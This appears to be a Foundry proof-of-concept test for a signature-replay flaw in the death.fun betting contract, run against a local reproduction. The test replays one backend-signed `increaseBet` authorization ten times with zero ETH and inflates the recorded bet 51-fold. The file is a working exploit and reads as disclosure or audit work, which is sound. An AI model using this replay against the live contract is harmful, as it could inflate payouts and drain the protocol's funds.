// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {DeathFunRepro} from "../src/DeathFunRepro.sol";

/// @dev PoC for death.fun (Abstract 2741): `increaseBet` binds neither msg.value nor a nonce and has no
///      consumed-signature guard, so ONE backend-signed increase authorization can be REPLAYED K times,
///      each with msg.value == 0 -> the on-chain `betAmount` inflates by K*amount for ZERO escrowed ETH.
///      Proves the on-chain broken invariant. (The drain itself is backend-conditional: realized only if
///      the off-chain backend sizes a cashOut payout from this manipulable on-chain betAmount.)
contract DeathFunIncreaseBetPoC is Test {
    DeathFunRepro df;
    uint256 internal constant ADMIN_PK = 0xA11CE;
    address internal admin;
    address internal player = address(0xBEEF);

    function setUp() public {
        admin = vm.addr(ADMIN_PK);
        df = new DeathFunRepro("deathfun", admin);
        vm.deal(player, 10 ether);
    }

    function _adminSign(bytes32 h) internal view returns (bytes memory) {
        bytes32 prefixed = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", h));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(ADMIN_PK, prefixed);
        return abi.encodePacked(r, s, v);
    }

    function test_increaseBet_freeReplayInflation() public {
        uint256 deadline = block.timestamp + 1 hours;

        // 1) player opens a game with a REAL 1 ETH bet (createGame sig binds msg.sender + msg.value -> honest)
        uint256 realBet = 1 ether;
        bytes32 createHash = keccak256(
            abi.encode("deathfun:createGame", "g1", bytes32("seed"), "v1", "{}", player, realBet, deadline)
        );
        vm.prank(player);
        df.createGame{value: realBet}("g1", bytes32("seed"), "v1", "{}", deadline, _adminSign(createHash));
        uint256 id = 1;

        (, , uint256 bet0, , , ) = df.games(id);
        assertEq(bet0, realBet, "betAmount starts equal to the real deposit");
        assertEq(address(df).balance, realBet, "contract escrows exactly the real bet");

        // 2) backend signs ONE increaseBet authorization: "+5 ETH on game 1, until deadline"
        //    (sig binds ONLY (prefix, gameId, amount, deadline) -- no msg.sender, no msg.value, no nonce)
        uint256 inc = 5 ether;
        bytes memory incSig = _adminSign(keccak256(abi.encode("deathfun:increaseBet", id, inc, deadline)));

        // 3) ATTACK: replay the SAME signature K times, each sending msg.value == 0
        uint256 K = 10;
        for (uint256 i = 0; i < K; i++) {
            vm.prank(player);
            df.increaseBet{value: 0}(id, inc, deadline, incSig); // zero ETH every time
        }

        (, , uint256 betN, , , ) = df.games(id);

        // on-chain betAmount inflated by K*inc, while NOT one wei of extra ETH was escrowed
        assertEq(betN, realBet + K * inc, "betAmount inflated by K*inc via signature replay");
        assertEq(address(df).balance, realBet, "contract balance UNCHANGED -- inflation was free");

        emit log_named_decimal_uint("ETH actually escrowed ", address(df).balance, 18); // 1.0
        emit log_named_decimal_uint("on-chain betAmount    ", betN, 18); // 51.0
        // a backend that signs cashOut payout from on-chain betAmount would over-pay 51x the real stake.
    }

    /// @dev Control: msg.value is genuinely ignored (even a single call with 0 ETH inflates betAmount).
    function test_increaseBet_ignoresMsgValue() public {
        uint256 deadline = block.timestamp + 1 hours;
        bytes32 createHash = keccak256(
            abi.encode("deathfun:createGame", "g2", bytes32("seed"), "v1", "{}", player, uint256(1 ether), deadline)
        );
        vm.prank(player);
        df.createGame{value: 1 ether}("g2", bytes32("seed"), "v1", "{}", deadline, _adminSign(createHash));
        uint256 id = 1;

        bytes memory incSig = _adminSign(keccak256(abi.encode("deathfun:increaseBet", id, uint256(3 ether), deadline)));
        vm.prank(player);
        df.increaseBet{value: 0}(id, 3 ether, deadline, incSig);

        (, , uint256 bet, , , ) = df.games(id);
        assertEq(bet, 4 ether, "betAmount += 3 ETH despite msg.value == 0");
        assertEq(address(df).balance, 1 ether, "no ETH was added");
    }
}
